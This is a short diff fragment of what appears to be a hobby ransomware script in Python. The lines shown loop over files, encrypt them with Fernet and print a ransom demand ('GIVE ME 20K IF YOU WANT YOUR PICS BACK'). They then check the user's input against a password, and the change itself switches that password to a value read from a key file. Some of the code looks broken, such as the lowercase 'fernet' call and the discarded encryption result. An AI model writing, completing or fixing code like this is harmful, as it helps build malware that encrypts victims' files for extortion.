@@ -43,7 +43,7 @@ for f in files_list:
 for n in weak_crack:
     fernet(unlock).encrypt(n)
     
-password = unlock
+password = unlock.read()
 Malek = input("GIVE ME 20K IF YOU WANT YOUR PICS BACK. Jk?")
 if Malek == password:
     print("Good job.")
